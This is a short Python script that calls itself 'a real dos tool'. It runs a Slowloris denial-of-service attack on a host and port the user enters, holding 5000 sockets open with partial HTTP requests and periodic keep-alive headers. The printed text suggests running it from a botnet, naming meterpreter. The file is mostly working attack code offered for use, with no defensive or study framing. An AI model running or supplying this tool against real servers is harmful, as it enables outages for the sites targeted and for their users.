import socket
import time


print("This is a real dos tool.")
print("This will likely have a low effect on servers unless ran on a botnet!")
print("E.g meterpreter.")
print("Enter target:")
target_host = input()
target_port = int(input("What port? If it's https use 443, if http use 80: ")) #


num_sockets = 5000  


sockets = []


print(f"Starting Slowloris attack on {target_host}:{target_port}...")

try:
    
    for i in range(num_sockets):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_host, target_port))
        s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target_host}\r\n".encode("utf-8"))
        sockets.append(s)
        print(f"Socket {i + 1} opened and initialized.")

    
    while True:
        for s in sockets:
            try:
                s.send("X-a: keep-alive\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(s)
                print("Socket closed, reopening...")
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_host, target_port))
                s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
                s.send(f"Host: {target_host}\r\n".encode("utf-8"))
                sockets.append(s)
        print("Sent keep-alive headers to all open sockets.")
        time.sleep(15)  
except KeyboardInterrupt:
    print("\nTest stopped. Closing all sockets.")
finally:
    for s in sockets:
        s.close()
    print("All sockets closed.")
